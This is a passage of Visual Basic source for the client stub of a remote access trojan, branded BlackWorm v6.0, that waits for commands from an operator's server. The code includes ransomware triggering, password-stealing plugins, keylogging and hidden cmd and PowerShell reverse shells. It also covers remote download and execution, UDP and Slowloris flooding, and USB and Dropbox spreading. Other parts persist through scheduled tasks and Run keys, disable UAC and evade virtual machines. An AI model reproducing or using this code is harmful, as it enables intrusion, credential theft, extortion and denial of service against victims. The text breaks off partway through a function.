﻿Imports System.Collections.Generic
Imports System.Runtime.InteropServices
Imports System.Diagnostics
Imports System.Windows.Forms
Imports System.Net.Sockets
Imports System.Net
Imports System.IO
Imports System.Text
Imports Microsoft.Win32
Imports System.Reflection
Imports System.Collections
Imports System
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Security.Cryptography
Imports System.Management
Imports System.Security.Principal
Imports System.Drawing
Imports System.ServiceProcess
'----------------------------------------------------
' سورس الستب للتشفير البرمجي او إضافة خصائص له
' Developed By : Black.Hacker
' اخر تحديث  20\04\1440
' - - - - - - - - - - - - - - - 
' إهداء الى موقع نقطة التطوير
' www.Dev-Point.com
' Black.Hacker - 2019
'----------------------------------------------------
Public Module A
    Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
    Public h As String = "[host]"
    Public p As String = "[port]"
    Public dwport As String = "[dwp]"
    Public Name As String = "[vn]"
    Public Y As String = "|BlackWorm|"
    Public Ver As String = "v6.0 [ Black Ninja ]"
    Public ulink As String = "[link]"
    Public startUP As String = "[startname]"
    Public addstart As String = "[startupstatus]"
    Public exen As String = "[exen]"
    Public taskmanager As String = "[antikill]"
    Public AntiVM As String = "[AntiVM]"
    Public EncryptStatus As String = "[Encrypt]"
    Public EncryptKey As String = "[EncryptKey]"
    Public BypassS As String = "[BypassScreening]"
    '================================================
    Public DownloaderStatus As String = "[DownloaderStatus]"
    Public DownloadURL As String = "[DownloadURL]"
    Public DownloadPath As String = "[DownloadPath]"
    Public DownloadName As String = "[DownloadName]"
    Public DownloadSleep As String = "[DownloadSleep]"
    '================================================
    Public BinderStatus As String = "[BinderStatus]"
    Public BinderString As String = "[BinderByte]"
    Public BinderPath As String = "[BinderPath]"
    Public BinderSleep As String = "[BinderSleep]"
    Public BinderName As String = "[BinderName]"
    '================================================
    Public WatcherStatus As String = "[WatcherStatus]"
    Public WatcherString As String = "[WatcherByte]"
    '================================================
    Public Password As String = "[Password]"
    Public spread As String
    Public check As String = checkadmin()
    Public UAC As String = "[UAC]"
    Public BitcoinAddress As String
    Public MTX As String = "[MUTEX]"
    Public DropBoxSpread As String = "[DropBox]"
    Public SchTaskEnable As String = "[SchTask]"
    Public MT As Mutex = Nothing
    Public ransompassword As String
    Public ShortCut As String = "[ShorCut]"
    Public PathS As String = "[Path]"
    Public HardInstall As String = "[HardInstall]"
    Public InstallName As String = "[InstallName]"
    Public crtical As String = "[Critical]"
    Private userName As String = Environment.UserName
    Private userDir As String = "C:\Users\"
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Public F As New Microsoft.VisualBasic.Devices.Computer
    Public C As New TCP
    Public s As String = New IO.FileInfo(Application.ExecutablePath).Name
    Public EXE As New IO.FileInfo(Application.ExecutablePath)
    Delegate Sub InvokeDelegate()
    Public st As Integer = 0
    Public trd As System.Threading.Thread
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Public Watcher As New WatcherSettings
    Public kl As New kl
    Dim cap As CRDP
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Public strin As String = Nothing
    Declare Function mciSend Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpszCommand As String, ByVal lpszReturnString As String, ByVal cchReturnLength As Long, ByVal hwndCallback As Long) As Long

    Public Sub Main()
        If My.Settings.Group = "" Or My.Settings.Group = "None" Then
            My.Settings.Group = "None"
            My.Settings.Save()
        Else

        End If
        Try ' check if i am running 2 times or something
            For Each x In Process.GetProcesses
                Try
                    If CompDir(New IO.FileInfo(x.MainModule.FileName), LO) Then
                        If x.Id > Process.GetCurrentProcess.Id Then
                            End
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
        Catch ex As Exception
        End Try
        Try
            Mutex.OpenExisting(DEB(MTX))
            End
        Catch ex As Exception
        End Try
        Try
            MT = New Mutex(True, DEB(MTX))
        Catch ex As Exception
            End
        End Try

        If HardInstall = "True" Then
            Call Install_Server()
            If Application.ExecutablePath = Environ(PathS) & "\Microsoft\MyClient\" & InstallName Then

            Else
                Process.Start(Environ(PathS) & "\Microsoft\MyClient\" & InstallName)
                Application.Exit()
                Try
                    IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
                Catch ex As Exception

                End Try
                End
            End If
        End If
        If My.Settings.Group = "" Or My.Settings.Group = "None" Then
            My.Settings.Group = "None"
            My.Settings.Save()
        Else

        End If
        Call UsbVicTim()

        If SchTaskEnable = "True" Then
            SchTask()
        End If

        If addstart = "True" Then
            st = 0
            trd = New System.Threading.Thread(AddressOf StartWork)
            trd.IsBackground = True
            trd.Start() ' every 2 Seconds Add Startup Values
        End If

        If DownloaderStatus = "True" Then
            Dim Downloader As New Downloader
            Downloader.StartDownlaoder(DownloadURL, DownloadPath, DownloadName, DownloadSleep)
        End If

        If BinderStatus = "True" Then
            Dim Binder As New Binder
            Binder.NewBinder(BinderString, BinderPath, BinderSleep, BinderName)
        End If

        If WatcherStatus = "True" Then
            Watcher.NewWatcher(WatcherString)
        End If

        If DropBoxSpread = "True" Then
            DropBoxSpreadFunc(exen)
        End If

        If ulink = "True" Then
            If spread = "Yes" Then

            Else
                Dim USB As New USB
                USB.ExeName = exen
                USB.Start()
            End If

        End If
        If UAC = "True" Then
            UACD()
        End If

        If taskmanager = "True" Then
            Try
                AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf ED
                pr(1) ' protect my process
            Catch ex As Exception
            End Try
        End If

        If AntiVM = "True" Then
            Dim AntiVMv As New AntiVM
            AntiVMv.ST(Application.ExecutablePath)
        End If

        If BypassS = "True" Then
            Call Screening_Programs.Bypass()
        End If

        If ShortCut = "True" Then
            Dim ShortcutInfect As New ShortcutInstall
            ShortcutInfect.ShortcutInfection()
        End If

        If crtical = "True" Then
            CriticalProcess()
        End If

        Dim tt As Object = New Thread(AddressOf kl.WRK, 1)
        tt.Start()



        Dim oldwindow As String = ""
        While True
            Thread.Sleep(5000)
            Dim s = ACT()
            If s <> oldwindow Then
                oldwindow = s
                C.Send(ENB("!1") & Y & ENB(s))
            End If
        End While

    End Sub
    Public Sub Transfer(Status As Boolean, Host As String, NewPort As Integer, NewID As String, NewPw As String)
        My.Settings.NewHost = Host
        My.Settings.NewPort = NewPort
        My.Settings.TransferStatus = True
        My.Settings.ID = NewID
        My.Settings.PW = NewPw
        My.Settings.Save()
    End Sub
    Public Sub UACD()
        Try
            Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", True)
            If (key.GetValue("EnableLUA").ToString = "1") Then
                key.SetValue("EnableLUA", "0")
            End If
        Catch exception1 As Exception

        End Try
    End Sub
    Public Sub SchTask()
        On Error Resume Next
        Dim Path = Environ(PathS) & "\Microsoft\" & "WindowsUpdate.exe"
        My.Computer.FileSystem.WriteAllBytes(Path, IO.File.ReadAllBytes(Application.ExecutablePath), True)
        Shell("schtasks /create /sc minute /mo 1 /tn " & "WindowsUpdate" & "/tr " & Path, AppWinStyle.Hide)
        Threading.Thread.Sleep(10000)
    End Sub
    Public Sub Install_Server()
        If Application.ExecutablePath = Environ(PathS) & "\Microsoft\MyClient\" & InstallName Then
            Return
        Else
            On Error Resume Next
            If IO.Directory.Exists(Environ(PathS) & "\Microsoft\MyClient\" & InstallName) Then
                ' Nothing
            Else
                IO.Directory.CreateDirectory(Environ(PathS) & "\Microsoft\MyClient\")
            End If
            Dim KA As String
            KA = "Microsoft" & "\MyClient\"
            If File.Exists(Environ(PathS) & "\" & KA & InstallName) Then
                IO.File.Delete(Environ(PathS) & "\" & KA & InstallName)
                Melt(Environ(PathS) & "\" & KA & InstallName)
            Else
                Melt(Environ(PathS) & "\" & KA & InstallName)
            End If
        End If
    End Sub
    Public Sub Melt(filename As String)
        File.Copy(Application.ExecutablePath, filename, True)
        File.SetAttributes(filename, FileAttributes.System + FileAttributes.Hidden)
        AStartup(startUP, filename)
    End Sub
    Public Function ENB(ByRef s As String) As String ' Encode base64
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Private Function CompDir(ByVal F1 As IO.FileInfo, ByVal F2 As IO.FileInfo) As Boolean ' Compare 2 path
        If F1.Name.ToLower <> F2.Name.ToLower Then Return False
        Dim D1 = F1.Directory
        Dim D2 = F2.Directory
re:
        If D1.Name.ToLower = D2.Name.ToLower = False Then Return False
        D1 = D1.Parent
        D2 = D2.Parent
        If D1 Is Nothing And D2 Is Nothing Then Return True
        If D1 Is Nothing Then Return False
        If D2 Is Nothing Then Return False
        GoTo re
    End Function
    Private Pro As Object
    Private Pro1 As Object
    Private UDPAttack As New UDP
    Public Sub IND(ByVal b As Byte())
        Dim A As String() = Split(BS(b), Y)
        Select Case DEB(A(0))
            Case "ping"
                C.Send(ENB("ping"))

            Case "CloseServer"
                C.Send(ENB("MSG") & Y & "Client Disconncted" & Y & "Succ" & Y & "decode")
                Watcher.StopWatcher(True)
                ED()
                pr(0)
                Application.Exit()
                End
            Case "RestartServer"
                C.Send(ENB("MSG") & Y & "Clinet Restarted" & Y & "Succ" & Y & "decode")
                Watcher.StopWatcher(True)
                ED()
                pr(0)
                Application.Restart()
                End
            Case "sendfile"
                C.Send(ENB("MSG") & Y & "File Uploaded" & Y & "Succ" & Y & "decode")
                IO.File.WriteAllBytes(IO.Path.GetTempPath & DEB(A(1)), Convert.FromBase64String(A(2)))
                System.Threading.Thread.Sleep(1000)
                Process.Start(IO.Path.GetTempPath & DEB(A(1)))
                C.Send(ENB("MSG") & Y & "File Has Been Uploaded" & Y & "Succ" & Y & "decode")
            Case "download"
                My.Computer.Network.DownloadFile(DEB(A(1)), IO.Path.GetTempPath & DEB(A(2)))
                System.Threading.Thread.Sleep(1000)
                Process.Start(IO.Path.GetTempPath & DEB(A(2)))
                C.Send(ENB("MSG") & Y & "File Uploaded From URL" & Y & "Succ" & Y & "decode")

            Case "UDPStart" ' Developed By Black.Hacker
                C.Send(ENB("MSG") & Y & "UDP Attack Started" & Y & "Succ" & Y & "decode")
                UDPAttack.Host = DEB(A(1))
                UDPAttack.Start()
            Case "UDPStop"
                UDPAttack.Abort()
                C.Send(ENB("MSG") & Y & "UDP Attack Stopped" & Y & "Succ" & Y & "decode")

            Case "startSlowloris"
                Slowloris.StartSlowloris(DEB(A(1)), 1000, 10000, "JE7&I&e56436CZRNPHM16IGZ5jZ4WG3057e^H1%RTIBC^Y#TMG0$ACZ881ZI^j6V2J4U%5J4&^^3j5E1#WS55IZPJR8#N#7J#7Re7eAWR&$GT4!0#$H^4T7I7He&Wrj$7^5eJEX7E5j$TK@8@Ee1M7UL$4WQMeW6ZTMMIOjeN63&251#rj3GS2T^3@3YGr$J4P22jNW7EXE0V#326J&XXDr#jKTJL#EI10ZX866MW4#@8PjTj&JU#Jj!T&65r61W1G$HIHPJMe7M3^&JG&WG4HR#EZ&&W$NRYUG3T!5IULKe")
                C.Send(ENB("MSG") & Y & "Slowloris Attack Started" & Y & "Succ" & Y & "decode")

            Case "stopSlowloris"
                Slowloris.StopSlowloris()
                C.Send(ENB("MSG") & Y & "Slowloris Attack Stoped" & Y & "Succ" & Y & "decode")
            Case "OpenPage"
                Process.Start(DEB(A(1)))
                C.Send(ENB("MSG") & Y & "Page Has Been Opend" & Y & "Succ" & Y & "decode")

            Case "BlocKPage"
                Try
                    My.Computer.FileSystem.WriteAllText("C:\WINDOWS\system32\drivers\etc\hosts", vbNewLine & "127.0.0.1" + "  " + DEB(A(1)), True)
                    C.Send(ENB("MSG") & Y & "Page Has Been Blocked" & Y & "Succ" & Y & "decode")
                Catch ex As Exception
                    C.Send(ENB("MSG") & Y & "Page Has not Been Blocked - Access Denied" & Y & "Fail" & Y & "decode")
                End Try

            Case "Logoff"
                C.Send(ENB("MSG") & Y & "Clinet Loged Off" & Y & "Succ" & Y & "decode")
                Shell("shutdown -l -t 00", AppWinStyle.Hide)
            Case "Restart"
                C.Send(ENB("MSG") & Y & "Clinet Device Restarted" & Y & "Succ" & Y & "decode")

                Shell("shutdown -r -t 00", AppWinStyle.Hide)
            Case "Shutdown"
                C.Send(ENB("MSG") & Y & "Clinet Device has been shutdown" & Y & "Succ" & Y & "decode")
                Shell("shutdown -s -t 00", AppWinStyle.Hide)

            Case "openkl"
                C.Send(ENB("MSG") & Y & "Keylogger Opend" & Y & "Succ" & Y & "decode")

                C.Send(ENB("openkl"))

            Case "Getloges"
                Try
                    C.Send(ENB("loges") & Y & ENB(IO.File.ReadAllText(kl.LogsPath)))
                Catch : End Try


            Case "getpass"
                Try
                    Dim p = System.Reflection.Assembly.Load(Convert.FromBase64String(A(1)))
                    Dim getPassword = p.CreateInstance(DEB("UGFzc3dvcmRQbHVnaW4uU3RlZWxQYXNzd29yZA=="))
                    C.Send(ENB("sendpass") & Y & ENB(getPassword.Dump()) & Y & ENB(Name & "_" & HWD()))
                    IO.File.Delete(Environ("Temp") & "\" & "WebPass.exe")
                    IO.File.Delete(Environ("Temp") & "\" & "ProdKey.exe")
                    IO.File.Delete(Environ("Temp") & "\" & "filezilla.txt")
                    C.Send(ENB("MSG") & Y & "Password Plugin Has Been Invoked" & Y & "Succ" & Y & "decode")
                Catch
                    C.Send(ENB("MSG") & Y & "Password Plugin Has Faild to invoke" & Y & "Fail" & Y & "decode")
                End Try


            Case "runzip"
                If HardInstall = "True" Then
                    Try
                        Dim p = System.Reflection.Assembly.Load(Convert.FromBase64String(A(1)))
                        Dim runzip = p.CreateInstance(DEB("WmlwSW5mZWN0b3JQbHVnaW4uTWFpbkF0dGFjaw=="))
                        runzip.RunInfection()
                        C.Send(ENB("MSG") & Y & "Zip Infection Plugin Has Been Invoked" & Y & "Succ" & Y & "decode")
                    Catch ex As Exception
                        C.Send(ENB("MSG") & ENB(ex.Message) & Y & "Fail" & Y & "base")
                    End Try
                Else
                    C.Send(ENB("MSG") & Y & "this function require hard install" & Y & "Fail" & Y & "decode")
                End If


            Case "opencustom"
                C.Send(ENB("opencustom"))

            Case "custom"
                Dim p = System.Reflection.Assembly.Load(Convert.FromBase64String(A(1)))
                Dim customPlugin = p.CreateInstance(A(2) & "." & A(3))
                If A(4) = "True" Then
                    If A(5) = "png" Then
                        C.Send(ENB("customoutput") & Y & Convert.ToBase64String(System.Text.ASCIIEncoding.ASCII.GetBytes(customPlugin.BlackPlugin())) & Y & Name & "_" & HWD() & Y & A(6))
                    ElseIf A(5) = "exe" Then
                        C.Send(ENB("customoutput") & Y & Convert.ToBase64String(System.Text.ASCIIEncoding.ASCII.GetBytes(customPlugin.BlackPlugin())) & Y & Name & "_" & HWD() & Y & A(6))
                    ElseIf A(5) = "txt" Then
                        C.Send(ENB("customoutput") & Y & customPlugin.BlackPlugin() & Y & Name & "_" & HWD() & Y & A(6))
                    End If
                Else
                    customPlugin.BlackPlugin()
                End If
                C.Send(ENB("MSG") & Y & "Custom Plugin Has Been Invoked" & Y & "Succ" & Y & "decode")


            Case "execscrip"
                IO.File.WriteAllText(IO.Path.GetTempPath + "\" & exen.Split(".")(0) & "." & DEB(A(2)), DEB(A(1)))
                Process.Start(IO.Path.GetTempPath + "\" & exen.Split(".")(0) & "." & DEB(A(2)))
                C.Send(ENB("MSG") & Y & "Script Has Been Executed" & Y & "Succ" & Y & "decode")


            Case "transfer"
                C.Send(ENB("MSG") & Y & "Client Has Been Transferd" & Y & "Succ" & Y & "decode")
                Transfer(True, DEB(A(1)), DEB(A(2)), A(3), DEB(A(4)))
                Watcher.StopWatcher(True)
                ED()
                pr(0)
                Application.Restart()
                End

            Case "startransom"
                Dim Ransom As New RansomWare
                Ransom.startAction()
                BitcoinAddress = DEB(A(1))
                C.Send(ENB("sendransompassword") & Y & ENB(ransompassword) & Y & ENB(Name & "_" & HWD()))
                C.Send(ENB("MSG") & Y & "Client Files Has Been Encrypted" & Y & "Succ" & Y & "decode")


            Case "stopransom"
                IO.File.WriteAllText(userDir & "\" & userName & "\Desktop\DecryptKey.txt", DEB(A(1)))
                IO.File.WriteAllBytes(userDir & "\" & userName & "\Desktop\Decryptor.exe", Convert.FromBase64String(A(2)))
                Process.Start(userDir & "\" & userName & "\Desktop\Decryptor.exe")
                C.Send(ENB("MSG") & Y & "Ransomware Decryptor Has Been Dropped" & Y & "Succ" & Y & "decode")

            Case "elevate"
                RestartElevated()


            Case "Update"
                C.Send(ENB("MSG") & Y & "Client Has Been Updated" & Y & "Succ" & Y & "decode")
                Watcher.StopWatcher(True)
                IO.File.WriteAllBytes(IO.Path.GetTempPath & DEB(A(1)), Convert.FromBase64String(A(2)))
                Thread.Sleep(1000)
                Process.Start(IO.Path.GetTempPath & DEB(A(1)))
                End

            Case "pr"
                Dim Pname As String = ENB("pr")
                For Each x As Process In Process.GetProcesses
                    Try
                        Pname &= Y & x.ProcessName & "||" & x.Id & "||" & x.MainModule.FileName & "||" & ENB(x.MainModule.FileVersionInfo.FileDescription) & "||" & x.MainModule.ModuleMemorySize
                    Catch
                        Pname &= Y & x.ProcessName & "||" & x.Id & "||" & "-" & "||" & "-" & "||" & "-"
                    End Try
                Next
                C.Send(Pname)


            Case "sr"
                Dim Sname As String = ENB("sr")
                For Each service As ServiceProcess.ServiceController In ServiceController.GetServices
                    Sname &= Y & service.ServiceName & "||" & service.DisplayName & "||" & service.ServiceType.ToString() & "||" & service.Status.ToString()
                Next
                C.Send(Sname)

            Case "sm"
                Try
                    Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
                    Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                    Dim Sname As String = ENB("smu")
                    For Each aba As String In Key.GetValueNames
                        Sname &= Y & aba & "/||\" & CType(Key.GetValue(aba), String)
                    Next
                    C.Send(Sname)
                Catch ex As Exception
                    C.Send(ENB("MSG") & Y & ENB(ex.Message) & Y & "Fail" & Y & "base")
                End Try

            Case "sml"
                Try
                    Dim Registry2 As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine
                    Dim Key2 As Microsoft.Win32.RegistryKey = Registry2.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                    Dim Sname As String = ENB("sml")
                    For Each aba2 As String In Key2.GetValueNames
                        Sname &= Y & aba2 & "/||\" & CType(Key2.GetValue(aba2), String)
                    Next
                    C.Send(Sname)
                Catch ex As Exception
                    C.Send(ENB("MSG") & Y & "Client is not Admin." & Y & "Fail" & Y & "decode")
                End Try


            Case "del"
                DStartup(A(1))

            Case "Control"
                Controller(A(1), DEB(A(2)))

            Case "rss" ' start remote shell
                Try
                    Pro.Kill()
                Catch ex As Exception
                End Try
                Pro = New Process
                Pro.StartInfo.RedirectStandardOutput = True
                Pro.StartInfo.RedirectStandardInput = True
                Pro.StartInfo.RedirectStandardError = True
                Pro.StartInfo.FileName = "cmd.exe"
                Pro.StartInfo.RedirectStandardError = True
                AddHandler CType(Pro, Process).OutputDataReceived, AddressOf RS
                AddHandler CType(Pro, Process).ErrorDataReceived, AddressOf RS
                AddHandler CType(Pro, Process).Exited, AddressOf ex
                Pro.StartInfo.UseShellExecute = False
                Pro.StartInfo.CreateNoWindow = True
                Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                Pro.EnableRaisingEvents = True
                C.Send(ENB("rss"))
                Pro.Start()
                Pro.BeginErrorReadLine()
                Pro.BeginOutputReadLine()

            Case "pss" ' start remote shell
                Try
                    Pro1.Kill()
                Catch ex As Exception
                End Try
                Pro1 = New Process
                Pro1.StartInfo.RedirectStandardOutput = True
                Pro1.StartInfo.RedirectStandardInput = True
                Pro1.StartInfo.RedirectStandardError = True
                Pro1.StartInfo.FileName = "powershell.exe"
                Pro1.StartInfo.RedirectStandardError = True
                AddHandler CType(Pro1, Process).OutputDataReceived, AddressOf PRS
                AddHandler CType(Pro1, Process).ErrorDataReceived, AddressOf PRS
                AddHandler CType(Pro1, Process).Exited, AddressOf pex
                Pro1.StartInfo.UseShellExecute = False
                Pro1.StartInfo.CreateNoWindow = True
                Pro1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                Pro1.EnableRaisingEvents = True
                C.Send(ENB("pss"))
                Pro1.Start()
                Pro1.BeginErrorReadLine()
                Pro1.BeginOutputReadLine()



            Case "rs"
                Pro.StandardInput.WriteLine(DEB((A(1))))

            Case "rsc"
                Try
                    Pro.Kill()
                Catch ex As Exception
                End Try
                Pro = Nothing

            Case "prs"
                Pro1.StandardInput.WriteLine(DEB((A(1))))

            Case "prsc"
                Try
                    Pro1.Kill()
                Catch ex As Exception
                End Try
                Pro1 = Nothing




            Case "!" ' server ask for my screen Size
                CRDP.Clear()
                Dim s = Screen.PrimaryScreen.Bounds.Size
                C.Send(ENB("!") & Y & s.Width & Y & s.Height)
            Case "!!" ' server ask for my screen Size
                CRDP.Clear()
                Dim s = Screen.PrimaryScreen.Bounds.Size
                C.Send(ENB("!!") & Y & s.Width & Y & s.Height)
            Case "@" ' Start Capture
                Dim SizeOfimage As Integer = A(1)
                Dim Split As Integer = A(2)
                Dim Quality As Integer = A(3)

                Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
                Dim M As New IO.MemoryStream
                Dim CMD As String = ENB("@") & Y
                M.Write(SB(CMD), 0, CMD.Length)
                M.Write(Bb, 0, Bb.Length)
                C.Send(M.ToArray)
                M.Dispose()

            Case "@@" ' Start Capture

                Dim SizeOfimage As Integer = A(1)
                Dim Split As Integer = A(2)
                Dim Quality As Integer = A(3)

                Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
                Dim M As New IO.MemoryStream
                Dim CMD As String = ENB("@@") & Y
                M.Write(SB(CMD), 0, CMD.Length)
                M.Write(Bb, 0, Bb.Length)
                C.Send(M.ToArray)
                M.Dispose()

            Case "#" ' mouse clicks
                Cursor.Position = New Point(A(1), A(2))
                mouse_event(A(3), 0, 0, 0, 1) '\

            Case "$" '  mouse move
                Cursor.Position = New Point(A(1), A(2))

            Case "kill"
                Try
                    For i As Integer = 1 To A.Length - 1
                        Process.GetProcessById(A(1)).Kill()
                    Next
                Catch ex As Exception
                    Return
                End Try

            Case "openscript"
                C.Send(ENB("openscript"))

            Case "opentransfer"
                C.Send(ENB("opentransfer"))

            Case "|||"
                C.Send(ENB("|||"))

            Case "viewimage"
                Try
                    C.Send(ENB("viewimage") & Y & Convert.ToBase64String(IO.File.ReadAllBytes(DEB(A(1)))))

                Catch ex As Exception

                End Try
            Case "GetDrives"
                Try
                    C.Send(ENB("FileManager") & Y & getDrives())
                Catch ex As Exception

                End Try

            Case "FileManager"
                Try
                    C.Send(ENB("FileManager") & Y & getFolders(DEB(A(1)) & "\") & getFiles(DEB(A(1))))
                Catch
                    C.Send(ENB("FileManager") & Y & "Error")
                End Try


            Case "Delete"
                Select Case A(1)
                    Case "Folder"
                        IO.Directory.Delete(DEB(A(2)))
                        C.Send(ENB("MSG") & Y & DEB(A(2)) & " - Has Been Deleted" & Y & "Succ" & Y & "decode")
                    Case "File"
                        IO.File.Delete(DEB(A(2)))
                        C.Send(ENB("MSG") & Y & DEB(A(2)) & " - Has Been Deleted" & Y & "Succ" & Y & "decode")
                End Select

            Case "Execute"
                Try
                    Process.Start(DEB(A(1)))
                Catch ex As Exception

                End Try


            Case "Rename"
                Try
                    Select Case A(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(DEB(A(2)), DEB(A(3)))
                            C.Send(ENB("MSG") & Y & DEB(A(2)) & " - Has Been Renamed To " & DEB(A(3)) & Y & "Succ" & Y & "decode")
                        Case "File"
                            My.Computer.FileSystem.RenameFile(DEB(A(2)), DEB(A(3)))
                            C.Send(ENB("MSG") & Y & DEB(A(2)) & " - Has Been Renamed To " & DEB(A(3)) & Y & "Succ" & Y & "decode")
                    End Select
                Catch ex As Exception
                    C.Send(ENB("MSG") & Y & ENB(ex.Message) & Y & "Fail" & Y & "base")
                End Try

            Case "sendfile"
                IO.File.WriteAllBytes(IO.Path.GetTempPath & DEB(A(1)), Convert.FromBase64String(A(2)))
                Thread.Sleep(1000)
                Process.Start(IO.Path.GetTempPath & A(1))

            Case "getdesktoppath" 'Coded By Volkano
                Dim specialfolder1 As String
                specialfolder1 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                C.Send(ENB("getpath") & Y & specialfolder1 & "\")

            Case "gettemppath" 'Coded By Volkano
                Dim specialfolder2 As String
                specialfolder2 = IO.Path.GetTempPath
                C.Send(ENB("getpath") & Y & specialfolder2 & "\")
            Case "getstartuppath" 'Coded By Volkano
                Dim specialfolder3 As String
                specialfolder3 = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                C.Send(ENB("getpath") & Y & specialfolder3 & "\")
            Case "getmydocumentspath" 'Coded By Volkano
                Dim specialfolder4 As String
                specialfolder4 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                C.Send(ENB("getpath") & Y & specialfolder4 & "\")

            Case "getdrivec"
                Dim drivec As String = "C:\"
                C.Send(ENB("getpath") & Y & drivec)


            Case "getdrived"
                Dim drived As String = "D:\"
                C.Send(ENB("getpath") & Y & drived)

            Case "getuserpath"
                Dim userp As String = "C:\Users\" & Environ("Username")
                C.Send(ENB("getpath") & Y & userp)

            Case "getsystem32"
                Dim userp As String = "C:\Windows\System32"
                C.Send(ENB("getpath") & Y & userp)

            Case "downloads"
                Dim specialfolder4 As String = "C:\Users\" & Environ("Username") & "\Downloads"
                C.Send(ENB("getpath") & Y & specialfolder4 & "\")


            Case "creatnewtextfile" 'Coded By Volkano
                Try
                    IO.File.Create(DEB(A(1))).Dispose()
                Catch ex As Exception
                    C.Send(ENB("MSG") & Y & "File Name Already Exists" & Y & "Fail" & Y & "decode")
                End Try
            Case "setaswallpaper" 'Coded By Volkano
                SystemParametersInfo(SETDESKWALLPAPER, 0, DEB(A(1)), UPDATEINIFILE)

            Case "sendfileto" 'Coded By Volkano

                IO.File.WriteAllBytes(DEB(A(1)), Convert.FromBase64String(A(2)))
                Thread.Sleep(1000)
                Process.Start(DEB(A(1)))


            Case "creatnewfolder" 'Coded By Volkano
                Try
                    My.Computer.FileSystem.CreateDirectory _
(A(1))

                Catch ez As Exception
                End Try
            Case "hidefolderfile" 'Coded By Volkano
                Dim hiden As FileAttribute = FileAttribute.Hidden
                Try
                    SetAttr(DEB(A(1)), hiden)
                Catch ex As Exception

                End Try
            Case "showfolderfile" 'Coded By Volkano
                Dim shown As FileAttribute = FileAttribute.Normal
                Try
                    SetAttr(DEB(A(1)), shown)
                Catch ex As Exception

                End Try

            Case "downloadfile"
                Try
                    Dim downloader As New FileSender
                    C.Send(ENB("largefile"))
                    downloader.fullname = DEB(A(1))
                    downloader.Threader()
                Catch

                End Try
               

            Case "tt"
                C.Send(ENB("tt"))

            Case "openlocation"
                C.Send(ENB("ipinfo"))

            Case "getinfo"
                Dim m As Image = CaptureDesktop()
                Dim cc As New ImageConverter
                Dim bb As Byte() = cc.ConvertTo(m, b.GetType)
                C.Send(ENB("getinfo") & Y & Environment.UserName & "||" & Gcc() & "||" & F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win") & "||" & GetAntiVirus() & "||" & GetFirewall() & "||" & GetCPU() & "||" & GPU() & "||" & GetSystemRAMSize() & "||" & Convert.ToBase64String(bb))
            Case "opengroup"
                C.Send(ENB("opengroup"))

            Case "aGroup"
                My.Settings.Group = A(1)
                My.Settings.Save()
                C.Send(ENB("aGroup") & Y & My.Settings.Group)

            Case "rGroup"
                C.Send(ENB("removeg") & Y & My.Settings.Group)
                My.Settings.Group = "None"
                My.Settings.Save()

            Case "uninstall"
                Try
                    My.Settings.Reset()
                    Watcher.StopWatcher(True)
                    ED()
                    pr(0)
                    DStartup(startUP)
                    C.Send(ENB("MSG") & Y & "Client Disconncted" & Y & "Succ" & Y & "decode")
                    Application.Exit()
                    End
                Catch ex As Exception
                    C.Send(ENB("MSG") & Y & "Client Disconncted" & Y & "Fail" & Y & "decode")
                End Try


        End Select
    End Sub
    Public Sub Controller(name As String, func As String)
        Try
            Dim ServiceControle As New System.ServiceProcess.ServiceController(name)
            Select Case func
                Case "Start"
                    ServiceControle.Start()
                    C.Send(ENB("MSG") & Y & "Service Started" & Y & "Succ" & Y & "decode")
                Case "Stop"
                    ServiceControle.Stop()
                    C.Send(ENB("MSG") & Y & "Service Stopped" & Y & "Succ" & Y & "decode")
                Case "Pause"
                    ServiceControle.Pause()
                    C.Send(ENB("MSG") & Y & "Service Paused" & Y & "Succ" & Y & "decode")
                Case "Resume"
                    ServiceControle.Continue()
                    C.Send(ENB("MSG") & Y & "Sevice Resumed" & Y & "Succ" & Y & "decode")
            End Select

        Catch ex As Exception
            C.Send(ENB("MSG") & Y & ENB(ex.Message) & Y & "Fail" & Y & "base")
        End Try
    End Sub
    Public Function GPU()
        Dim query As New System.Management.SelectQuery("Win32_VideoController")
        Dim search As New System.Management.ManagementObjectSearcher(query)
        Dim info As System.Management.ManagementObject
        For Each info In search.Get
            Return info("Caption").ToString
        Next
    End Function
    Private Sub RS(ByVal a As Object, ByVal e As Object) 'Handles k.OutputDataReceived
        Try
